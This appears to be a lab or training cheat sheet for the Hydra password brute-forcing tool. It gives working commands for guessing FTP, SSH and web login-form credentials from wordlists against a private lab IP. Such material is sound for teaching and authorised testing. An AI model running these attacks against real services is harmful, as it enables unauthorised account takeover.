# Hydra

## Table of Contents

- [Introduction](#introduction)
- [Installation](#installation)
- [Usage](#usage)
  - [Basic Commands](#basic-commands)
  - [SSH Brute Force](#ssh-brute-force)
  - [Web Form Brute Force](#web-form-brute-force)

## Introduction

Hydra is a brute force online password cracking tool that can attack various authentication services including SSH, FTP, HTTP forms, and many other protocols. It automates password guessing by running through password lists against target services.

**Key protocols supported:** SSH, FTP, HTTP-FORM-POST, HTTPS, SMB, SMTP, MySQL, PostgreSQL, RDP, VNC, and many more.

**Security note:** This demonstrates why strong, unique passwords are essential - weak or default credentials (like admin:password) are easily compromised.

## Installation

- **Kali Linux/AttackBox:** Pre-installed
- **Ubuntu/Debian:** `apt install hydra`
- **Fedora:** `dnf install hydra`
- **Source:** THC-Hydra repository

## Usage

### Basic Commands

The basic syntax depends on the target service:

```bash
hydra -l user -P passlist.txt ftp://10.10.0.7
```

### SSH Brute Force

```bash
hydra -l <username> -P <password_list> <target_ip> -t 4 ssh
```

| Option | Description |
|--------|-------------|
| `-l` | Username for login |
| `-P` | Password list file |
| `-t` | Number of parallel threads |

**Example:**
```bash
hydra -l root -P passwords.txt 10.10.0.7 -t 4 ssh
```

### Web Form Brute Force

```bash
hydra -l <username> -P <wordlist> <target_ip> http-post-form "<path>:<credentials>:<failure_string>" -V
```

| Option | Description |
|--------|-------------|
| `http-post-form` | POST form attack type |
| `<path>` | Login page URL (e.g., `/login.php`) |
| `<credentials>` | Form fields (`username=^USER^&password=^PASS^`) |
| `<failure_string>` | Text that appears on failed login |
| `-V` | Verbose output |

**Example:**
```bash
hydra -l admin -P passwords.txt 10.10.0.7 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
